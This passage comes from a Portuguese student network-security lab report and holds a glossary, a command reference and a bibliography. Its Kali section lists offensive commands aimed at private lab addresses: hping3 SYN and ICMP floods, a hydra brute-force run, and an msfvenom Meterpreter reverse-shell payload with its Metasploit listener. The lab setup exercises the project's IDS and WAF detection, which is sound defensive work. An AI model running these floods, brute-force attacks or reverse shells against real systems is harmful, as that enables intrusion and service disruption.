**IIS** *(Internet Information Services)* --- Servidor web da Microsoft
instalado no Windows Server Core 2022 da zona Orange MarteSuf,
responsável por servir o site [*www.CET103.AMM*](http://www.CET103.AMM)
com autenticação por base de dados.

**K**

**Kali Linux** --- Distribuição Linux especializada em testes de
penetração e segurança ofensiva. No projeto, é a principal ferramenta da
zona Red, utilizada para port scans, ataques DOS, brute force e criação
de reverse shells.

**L**

**Least Privilege** *(Princípio do Menor Privilégio)* --- Princípio de
segurança que determina que cada utilizador, processo ou sistema deve
ter apenas os acessos estritamente necessários para desempenhar a sua
função.

**Loki** --- Base de dados de logs desenvolvida pela Grafana Labs,
otimizada para armazenamento e pesquisa de grandes volumes de logs. No
projeto, recebe os logs enviados pelo Promtail e disponibiliza-os para
consulta no Grafana.

**M**

**Metasploit** --- Framework open-source de testes de penetração que
inclui ferramentas para exploração de vulnerabilidades, criação de
payloads e gestão de sessões de acesso remoto. No projeto, utilizado
pelo Kali para gerar e gerir a reverse shell contra o Windows 11 da zona
Red.

**ModSecurity** --- Motor de WAF open-source integrado no servidor Nginx
da zona Orange MarteSuf. Inspeciona o tráfego HTTP/HTTPS e bloqueia
pedidos maliciosos com base no OWASP Core Rule Set.

**msfvenom** --- Ferramenta do Metasploit para geração de payloads em
múltiplos formatos. No projeto, utilizada para criar o executável de
reverse shell (*reverse_tcp*) que é entregue e executado no Windows 11
da zona Red.

**N**

**NAT** *(Network Address Translation)* --- Técnica que traduz endereços
IP privados para um endereço público, permitindo que múltiplos hosts
partilhem uma única ligação à internet. No projeto, configurado no
Router Cisco com PAT (*overload*).

**Nessus / OpenVAS** --- Ferramentas de análise de vulnerabilidades que
identificam CVEs, configurações incorretas e serviços desatualizados nas
máquinas analisadas. No projeto, instaladas num servidor Fedora da zona
Green VenusSuf e utilizadas para analisar todas as VMs do projeto.

**Nginx** --- Servidor web e proxy reverso open-source. No projeto,
utilizado na zona Orange MarteSuf em conjunto com o ModSecurity para
funcionar como WAF e reverse proxy para o servidor IIS.

**Nikto** --- Scanner de vulnerabilidades web que identifica ficheiros e
configurações inseguras em servidores HTTP. No projeto, utilizado pelo
Kali Linux para analisar o servidor CentOS da zona Orange VenusSuf.

**Nmap** --- Ferramenta de port scanning e deteção de sistemas e
serviços numa rede. No projeto, utilizada pelo Kali Linux para
reconhecimento das interfaces WAN dos firewalls, acionando os sistemas
de deteção de intrusão.

**NPS** *(Network Policy Server)* --- Serviço da Microsoft que
implementa um servidor RADIUS, permitindo autenticação centralizada de
clientes VPN contra o Active Directory. No projeto, instalado no Windows
Server 2022 da zona Green MarteSuf.

**O**

**OPNsense** --- Distribuição de firewall e router open-source baseada
em FreeBSD. No projeto, utilizada como firewall MarteSuf, com zonas
Orange (DMZ) e Green (LAN interna), IDS Suricata e VPN OpenVPN.

**OpenVPN** --- Protocolo e software de VPN open-source que suporta
autenticação por certificados e por credenciais via RADIUS. No projeto,
implementado na MarteSuf como VPN roadwarrior com autenticação RADIUS
contra o Active Directory, restrita ao grupo IT.

**OU** *(Organizational Unit)* --- Contentor lógico do Active Directory
que agrupa objetos como utilizadores e computadores, permitindo a
aplicação de GPOs de forma granular. No projeto, as OUs estão
organizadas por localização geográfica (Norte, Sul, Este) e departamento
(IT, RH, Formação).

**OWASP CRS** *(Core Rule Set)* --- Conjunto de regras open-source para
o ModSecurity que protege contra os ataques mais comuns da web,
incluindo os do OWASP Top 10. Utilizado no WAF da zona Orange MarteSuf.

**OWASP Top 10** --- Lista das dez vulnerabilidades mais críticas em
aplicações web, publicada pela Open Web Application Security Project.
Inclui SQL Injection, XSS, autenticação quebrada, entre outras.

**P**

**PAT** *(Port Address Translation)* --- Variante do NAT em que
múltiplos hosts partilham um único endereço IP público, diferenciados
pelos números de porto TCP/UDP. Ativado com a keyword *overload* no
Cisco IOS.

**Payload** --- Código malicioso entregue ao sistema alvo durante um
ataque. No projeto, refere-se ao executável gerado pelo msfvenom que, ao
ser corrido no Windows 11 da zona Red, estabelece uma reverse shell para
o Kali Linux.

**pfSense** --- Distribuição de firewall e router open-source baseada em
FreeBSD. No projeto, utilizada como firewall VenusSuf, com zonas Orange
(DMZ com CentOS) e Green (LAN interna com syslog-ng e OpenVAS), IDS
Snort e VPN Wireguard.

**Promtail** --- Agente de recolha de logs desenvolvido pela Grafana
Labs. No projeto, lê os ficheiros de log gerados pelo syslog-ng e
envia-os para o Loki com labels e metadados para posterior pesquisa no
Grafana.

**R**

**RADIUS** *(Remote Authentication Dial-In User Service)* --- Protocolo
de autenticação centralizada que permite verificar credenciais de
utilizadores num servidor central. No projeto, utilizado pelo OPNsense
para autenticar os clientes OpenVPN contra o Active Directory através do
NPS.

**Reverse Shell** --- Técnica de ataque em que é a própria vítima que
inicia a ligação para o atacante, contornando regras de firewall que
bloqueiam ligações de entrada. No projeto, utilizada pelo Kali Linux
para obter controlo remoto do Windows 11 da zona Red.

**Router-on-a-Stick** --- Modelo de routing inter-VLAN onde um único
router com uma única interface física utiliza sub-interfaces para
encaminhar tráfego entre múltiplas VLANs. No projeto, implementado no
Router Cisco 4300 com a interface G0/0/0 dividida em sub-interfaces para
as VLANs 10, 20, 30 e 103.

**RSA** --- Algoritmo de criptografia assimétrica utilizado na geração
de chaves para o SSH. No projeto, são geradas chaves RSA de 2048 bits no
Router Cisco como pré-requisito para ativar o SSHv2.

**S**

**SIEM** *(Security Information and Event Management)* --- Sistema que
agrega, correlaciona e analisa eventos de segurança de múltiplas fontes.
No projeto, implementado com o Wazuh na zona Green MarteSuf.

**Snort** --- Sistema de deteção de intrusão open-source baseado em
regras. No projeto, instalado no pfSense VenusSuf para monitorizar o
tráfego da interface WAN e detetar port scans e ataques DOS provenientes
da zona Red.

**SQL Injection** --- Técnica de ataque web que consiste em inserir
código SQL malicioso em campos de entrada de uma aplicação, podendo
permitir acesso não autorizado à base de dados. Bloqueado pelo WAF
ModSecurity na zona Orange MarteSuf.

**SSH** *(Secure Shell)* --- Protocolo de acesso remoto seguro que
encripta toda a comunicação. No projeto, utilizado para administração do
Router Cisco e dos Switches Huawei, restrito à VLAN 103 de gestão e
configurado exclusivamente em SSHv2.

**SSHv2** --- Versão 2 do protocolo SSH, que corrige vulnerabilidades da
versão anterior, incluindo ataques man-in-the-middle. Explicitamente
forçado na configuração do Router Cisco.

**Suricata** --- Sistema de deteção de intrusão open-source com suporte
a processamento multi-thread. No projeto, instalado no OPNsense MarteSuf
para monitorizar o tráfego e integrar com o Wazuh para resposta ativa a
incidentes.

**syslog-ng** --- Servidor de logs avançado que recebe, processa e
armazena mensagens de log de múltiplos sistemas remotos. No projeto,
instalado num servidor Debian da zona Green VenusSuf, atuando como hub
central de logging de toda a infraestrutura.

**T**

**TLS** *(Transport Layer Security)* --- Protocolo de encriptação para
comunicações na internet, utilizado no HTTPS. No projeto, configurado no
terceiro site do servidor CentOS com um certificado self-signed.

**Trunk Port** --- Porta de switch configurada para transportar tráfego
de múltiplas VLANs com tags 802.1Q. No projeto, utilizada nas ligações
entre switches e entre o switch e o router.

**V**

**VLAN** *(Virtual Local Area Network)* --- Segmentação lógica de uma
rede física em múltiplas redes virtuais independentes. No projeto, são
utilizadas quatro VLANs: 10 (Red), 20 (VenusSuf), 30 (MarteSuf) e 103
(Gestão).

**VPN** *(Virtual Private Network)* --- Túnel encriptado sobre uma rede
pública que permite comunicação segura como se os intervenientes
estivessem na mesma rede privada. No projeto, são implementadas três
VPNs: Wireguard roadwarrior, OpenVPN roadwarrior e IPSec site-to-site.

**VyOS** --- Router virtual open-source baseado em Linux, utilizado no
projeto como ambiente de pré-produção doméstico para validar o plano de
endereçamento IP e a lógica de routing antes da implementação no
hardware físico Cisco.

**W**

**WAF** *(Web Application Firewall)* --- Firewall especializado em
tráfego HTTP/HTTPS que inspeciona o conteúdo dos pedidos web e bloqueia
ataques a aplicações web. No projeto, implementado com Nginx e
ModSecurity na zona Orange MarteSuf.

**Wazuh** --- Plataforma open-source de SIEM e XDR que recolhe e
correlaciona eventos de segurança de múltiplos sistemas através de
agentes. No projeto, instalado na zona Green MarteSuf, integrando
alertas do Snort e Suricata e executando respostas ativas automáticas
como o bloqueio de IPs atacantes por 10 minutos.

**Wireshark** --- Analisador de tráfego de rede open-source que permite
capturar e inspecionar pacotes em tempo real. No projeto, utilizado pelo
Kali Linux para análise do tráfego de rede e verificação da encriptação
TLS.

**Wireguard** --- Protocolo VPN moderno e minimalista que utiliza
criptografia de curva elíptica (Curve25519) e o algoritmo ChaCha20 para
encriptação. No projeto, implementado no pfSense VenusSuf como VPN
roadwarrior para o Windows 10/11 da zona Red, com autenticação
exclusivamente por chaves criptográficas.

**X**

**XSS** *(Cross-Site Scripting)* --- Técnica de ataque web que consiste
em injetar código JavaScript malicioso numa página web, podendo ser
executado no browser de outros utilizadores. Bloqueado pelo WAF
ModSecurity com o OWASP CRS.

######## Glossário de Comandos Úteis 

  ---------------------------------------------------------------------------
  **COMANDO**                           **DESCRIÇÃO**
  ------------------------------------- -------------------------------------
  **CISCO IOS --- Router Cisco 4300**   

  show ip route                         Apresenta a tabela de routing com
                                        todas as rotas conhecidas

  show ip interface brief               Lista todas as interfaces com o
                                        respetivo estado e endereço IP

  show running-config                   Apresenta a configuração atualmente
                                        em memória

  show startup-config                   Apresenta a configuração guardada em
                                        NVRAM

  show ip nat translations              Lista as traduções NAT ativas no
                                        momento

  show ip nat statistics                Apresenta estatísticas do NAT,
                                        incluindo número de traduções ativas

  show ip dhcp binding                  Lista os endereços IP atribuídos pelo
                                        servidor DHCP

  show ip dhcp pool                     Apresenta os pools DHCP configurados
                                        e o seu estado

  show access-lists                     Lista todas as ACLs configuradas e o
                                        número de correspondências

  show users                            Mostra os utilizadores atualmente
                                        ligados ao router

  show crypto key mypubkey rsa          Apresenta a chave pública RSA gerada
                                        para o SSH

  show version                          Apresenta a versão do IOS e
                                        informações sobre o hardware

  copy running-config startup-config    Guarda a configuração atual em NVRAM
                                        (persistente após reboot)

  wr                                    Forma abreviada de copy
                                        running-config startup-config

  crypto key generate rsa modulus 2048  Gera o par de chaves RSA de 2048 bits
                                        necessário para o SSHv2

  crypto key zeroize rsa                Elimina as chaves RSA existentes

  ip nat log translations syslog        Ativa o envio de logs das traduções
                                        NAT para o servidor syslog

  logging 172.20.50.194                 Define o servidor syslog de destino
                                        para os logs do router

  debug ip ssh                          Ativa o modo de debug do SSH para
                                        troubleshooting

  undebug all                           Desativa todos os debugs ativos

  no shutdown                           Ativa uma interface que se encontra
                                        desligada

  service password-encryption           Encripta todas as passwords visíveis
                                        no ficheiro de configuração

  **HUAWEI VRP --- Switches S5720S**    

  display vlan                          Lista todas as VLANs criadas no
                                        switch

  display interface brief               Apresenta o estado resumido de todas
                                        as interfaces

  display interface                     Apresenta informação detalhada de uma
  GigabitEthernet0/0/1                  interface específica

  display mac-address                   Apresenta a tabela de endereços MAC
                                        aprendidos

  display ip routing-table              Apresenta a tabela de routing do
                                        switch

  display current-configuration         Apresenta a configuração atualmente
                                        em execução

  display users                         Mostra os utilizadores atualmente
                                        ligados ao switch

  vlan batch 10 20 30 103               Cria múltiplas VLANs de uma só vez

  port link-type access                 Configura uma porta como access (uma
                                        única VLAN, sem tag)

  port link-type trunk                  Configura uma porta como trunk
                                        (múltiplas VLANs com tag 802.1Q)

  port default vlan 10                  Atribui uma porta access à VLAN
                                        especificada

  port trunk allow-pass vlan 10 20 30   Define quais as VLANs permitidas numa
  103                                   porta trunk

  save                                  Guarda a configuração atual de forma
                                        persistente

  ping 10.103.50.1                      Testa a conectividade para um
                                        endereço IP

  **VYOS --- Router Virtual**           

  configure                             Entra no modo de configuração

  commit                                Aplica as alterações feitas na sessão
                                        atual

  save                                  Guarda a configuração de forma
                                        persistente

  show interfaces                       Lista todas as interfaces e os seus
                                        estados

  show ip route                         Apresenta a tabela de routing

  set interfaces ethernet eth1 vif 10   Cria uma sub-interface (VLAN 10) com
  address 10.10.50.65/29                o endereço IP especificado

  set protocols static route            Adiciona rota estática para a zona
  192.168.50.248/29 next-hop            Orange VenusSuf
  10.20.50.98                           

  set protocols static route            Adiciona rota estática para a zona
  172.20.50.192/28 next-hop 10.20.50.98 Green VenusSuf

  set protocols static route            Adiciona rota estática para a zona
  192.168.150.240/29 next-hop           Orange MarteSuf
  10.30.50.130                          

  set protocols static route            Adiciona rota estática para a zona
  172.30.50.96/28 next-hop 10.30.50.130 Green MarteSuf

  set firewall name PROTEGE_GESTAO      Cria uma política de firewall com
  default-action drop                   negação por defeito

  set firewall name PROTEGE_GESTAO rule Adiciona uma regra de permissão à
  10 action accept                      política de firewall

  set interfaces ethernet eth1 vif 103  Aplica a política de firewall à
  firewall in name PROTEGE_GESTAO       interface de gestão

  **LINUX --- Geral (Debian / Ubuntu /  
  Fedora)**                             

  ip addr show                          Apresenta todas as interfaces de rede
                                        e os respetivos endereços IP

  ip route show                         Apresenta a tabela de routing

  ping -c 4 8.8.8.8                     Testa a conectividade enviando 4
                                        pacotes ICMP

  traceroute 8.8.8.8                    Traça o caminho dos pacotes até ao
                                        destino

  ss -tulnp                             Lista todos os portos em escuta e os
                                        processos associados

  netstat -tulnp                        Alternativa ao ss em sistemas mais
                                        antigos

  journalctl -xe                        Apresenta os logs do sistema com
                                        contexto de erros

  tail -f /var/log/syslog               Acompanha os logs do sistema em tempo
                                        real

  tail -f /var/log/auth.log             Acompanha os logs de autenticação em
                                        tempo real

  systemctl status syslog-ng            Verifica o estado do serviço
                                        syslog-ng

  systemctl start\|stop\|restart        Inicia, para ou reinicia o serviço
  syslog-ng                             syslog-ng

  systemctl enable syslog-ng            Configura o serviço para iniciar
                                        automaticamente

  ps aux \| grep nginx                  Verifica se o processo nginx está em
                                        execução

  nginx -t                              Verifica a sintaxe do ficheiro de
                                        configuração do Nginx

  nc -zv 192.168.50.250 80              Testa a conectividade TCP a um porto
                                        específico

  curl -I http://192.168.50.250         Obtém apenas os cabeçalhos HTTP de um
                                        servidor web

  curl -k https://192.168.50.250        Acede a um site HTTPS ignorando erros
                                        de certificado

  iptables -L -n -v                     Lista as regras de firewall ativas
                                        (iptables)

  nft list ruleset                      Lista as regras de firewall ativas
                                        (nftables)

  wg show                               Apresenta o estado atual do túnel
                                        Wireguard

  wg showconf wg0                       Apresenta a configuração completa da
                                        interface Wireguard

  tail -f /var/log/hosts/\*.log         Acompanha em tempo real os logs
                                        recebidos pelo syslog-ng

  **WINDOWS --- PowerShell & CMD**      

  ipconfig /all                         Apresenta a configuração completa de
                                        todas as interfaces de rede

  ipconfig /release                     Liberta o endereço IP atribuído por
                                        DHCP

  ipconfig /renew                       Solicita um novo endereço IP ao
                                        servidor DHCP

  ping 8.8.8.8                          Testa a conectividade de rede

  tracert 8.8.8.8                       Traça o caminho dos pacotes até ao
                                        destino

  route print                           Apresenta a tabela de routing

  netstat -ano                          Lista todas as ligações de rede
                                        ativas e os processos associados

  New-ADUser -Name \... -SamAccountName Cria um novo utilizador no Active
  \...                                  Directory

  Add-ADGroupMember -Identity           Adiciona um utilizador a um grupo do
  \'ITGeral\' -Members plinha           Active Directory

  Get-ADGroupMember -Identity           Lista os membros de um grupo do
  \'ITGeral\'                           Active Directory

  Add-Computer -DomainName              Junta a máquina ao domínio e reinicia
  \'AntMarMat.win\' -Restart            

  Get-EventLog -LogName Security        Lista os 20 eventos de segurança mais
  -Newest 20                            recentes

  rasdial \"NomeVPN\" username password Estabelece uma ligação VPN por linha
                                        de comando

  mstsc /v:172.30.50.98                 Abre uma sessão de Ambiente de
                                        Trabalho Remoto (RDP)

  **KALI LINUX --- Pentesting**         

  nmap -sV 10.20.50.98                  Port scan com deteção de versões de
                                        serviços

  nmap -sS -O 10.20.50.98               SYN scan furtivo com deteção de
                                        sistema operativo

  nmap -p- \--open 192.168.50.250       Scan de todos os portos, mostrando
                                        apenas os abertos

  nmap -A 10.30.50.130                  Scan agressivo com OS, scripts e
                                        traceroute

  nikto -h http://192.168.50.250        Scanner de vulnerabilidades web
                                        contra o servidor CentOS

  nikto -h https://192.168.50.250 -ssl  Scanner de vulnerabilidades web em
                                        modo HTTPS

  hping3 \--flood \--icmp 10.20.50.98   Ataque de flood ICMP (simula DOS)

  hping3 -S \--flood -p 80 10.20.50.98  Ataque SYN flood na porta 80 (simula
                                        DOS)

  hydra -l admin -P rockyou.txt         Brute force ao site com autenticação
  192.168.50.250 http-get /site2/       HTTP Basic

  msfvenom -p                           Gera um payload de reverse shell para
  windows/x64/meterpreter/reverse_tcp   Windows
  LHOST=10.10.50.69 LPORT=4444 -f exe   
  -o shell.exe                          

  msfconsole                            Inicia a consola interativa do
                                        Metasploit

  use multi/handler                     Seleciona o módulo listener do
                                        Metasploit

  set payload                           Define o payload a usar no listener
  windows/x64/meterpreter/reverse_tcp   

  set LHOST 10.10.50.69                 Define o endereço IP do atacante
                                        (Kali)

  set LPORT 4444                        Define o porto de escuta do listener

  run                                   Inicia o listener à espera da ligação
                                        da reverse shell

  wireshark &                           Abre o Wireshark em modo gráfico

  tcpdump -i eth0 -w captura.pcap       Captura tráfego de rede para um
                                        ficheiro

  tcpdump -i eth0 host 10.20.50.98      Captura tráfego filtrado por endereço
                                        IP

  dirb http://192.168.50.250            Brute force de directorias e
                                        ficheiros no servidor web

  curl -u admin:Passw0rd                Acede a um site com autenticação HTTP
  http://192.168.50.250/site2/          Basic

  **PFSENSE / OPNSENSE --- Shell        
  (FreeBSD)**                           

  ifconfig                              Lista todas as interfaces de rede e
                                        os respetivos endereços IP

  netstat -rn                           Apresenta a tabela de routing

  pfctl -sr                             Lista todas as regras de firewall
                                        ativas

  pfctl -ss                             Lista todas as ligações de rede
                                        ativas (estado da firewall)

  ipsec statusall                       Apresenta o estado detalhado de todas
                                        as ligações IPSec

  swanctl \--list-sas                   Lista as Security Associations IPSec
                                        ativas

  wg show                               Apresenta o estado atual do túnel
                                        Wireguard

  tail -f /var/log/snort/alert          Acompanha em tempo real os alertas do
                                        Snort (pfSense)

  tail -f /var/log/suricata/eve.json    Acompanha em tempo real os alertas do
                                        Suricata (OPNsense)

  ping 8.8.8.8                          Testa a conectividade de rede a
                                        partir do firewall

  **WAZUH --- Gestor SIEM**             

  systemctl status wazuh-manager        Verifica o estado do serviço Wazuh
                                        Manager

  systemctl restart wazuh-manager       Reinicia o serviço Wazuh Manager

  tail -f /var/ossec/logs/ossec.log     Acompanha em tempo real os logs do
                                        Wazuh

  tail -f                               Acompanha em tempo real os alertas
  /var/ossec/logs/alerts/alerts.log     gerados pelo Wazuh

  /var/ossec/bin/agent_control -l       Lista todos os agentes Wazuh
                                        registados e o seu estado

  /var/ossec/bin/agent_control -r -u    Reinicia um agente Wazuh específico
  001                                   

  **GRAFANA / LOKI / PROMTAIL**         

  systemctl status grafana-server       Verifica o estado do serviço Grafana

  systemctl status loki                 Verifica o estado do serviço Loki

  systemctl status promtail             Verifica o estado do serviço Promtail

  tail -f /var/log/loki/loki.log        Acompanha os logs do serviço Loki

  curl http://localhost:3100/ready      Verifica se o Loki está operacional

  curl http://localhost:3000            Verifica se o Grafana está acessível
  ---------------------------------------------------------------------------

######## Webgrafia 

**Cisco IOS --- Router & Switching**

-   Cisco. *Cisco IOS Configuration Guide*.
    <https://www.cisco.com/c/en/us/support/ios-nx-os-software/ios-xe-17/series.html>

-   Cisco. *NAT Configuration Guide*.
    <https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/ipaddr_nat/configuration/xe-17/nat-xe-17-book.html>

**Huawei VRP --- Switches**

-   Huawei. *S5700 Series Switches Configuration Guide*.
    <https://support.huawei.com/enterprise/en/switches/s5700-pid-6870009.htm>

**pfSense & OPNsense**

-   Netgate. *pfSense Documentation*.
    <https://docs.netgate.com/pfsense/en/latest/>

-   OPNsense. *OPNsense Documentation*. <https://docs.opnsense.org/>

**Snort & Suricata**

-   Snort. *Snort Users Manual*. <https://www.snort.org/documents>

-   Suricata. *Suricata Documentation*. <https://docs.suricata.io/>

**Wazuh SIEM**

-   Wazuh. *Wazuh Documentation*.
    <https://documentation.wazuh.com/current/index.html>

**Syslog-ng, Loki, Promtail & Grafana**

-   Syslog-ng. *syslog-ng Documentation*.
    <https://www.syslog-ng.com/technical-documents/>

-   Grafana Labs. *Loki Documentation*.
    <https://grafana.com/docs/loki/latest/>

-   Grafana Labs. *Grafana Documentation*.
    <https://grafana.com/docs/grafana/latest/>

**VPNs --- Wireguard, OpenVPN & IPSec**

-   WireGuard. *WireGuard Official Documentation*.
    <https://www.wireguard.com/>

-   OpenVPN. *OpenVPN Documentation*.
    <https://openvpn.net/community-resources/>

-   strongSwan. *IPSec/IKEv2 Documentation*.
    <https://docs.strongswan.org/>

**Active Directory & Windows Server**

-   Microsoft. *Active Directory Documentation*.
    <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview>

-   Microsoft. *Network Policy Server (NPS)*.
    <https://learn.microsoft.com/en-us/windows-server/networking/technologies/nps/nps-top>

**ModSecurity & OWASP**

-   OWASP. *OWASP ModSecurity Core Rule Set*. <https://coreruleset.org/>

-   OWASP. *OWASP Top Ten*. <https://owasp.org/www-project-top-ten/>

**OpenVAS / Nessus**

-   Greenbone. *OpenVAS Documentation*.
    <https://greenbone.github.io/docs/>

-   Tenable. *Nessus Documentation*.
    <https://docs.tenable.com/nessus.htm>

**VyOS**

-   VyOS. *VyOS Documentation*. <https://docs.vyos.io/en/latest/>

**Kali Linux & Ferramentas de Pentesting**

-   Offensive Security. *Kali Linux Documentation*.
    <https://www.kali.org/docs/>

-   Rapid7. *Metasploit Documentation*.
    <https://docs.rapid7.com/metasploit/>

-   Nmap. *Nmap Reference Guide*. <https://nmap.org/book/man.html>
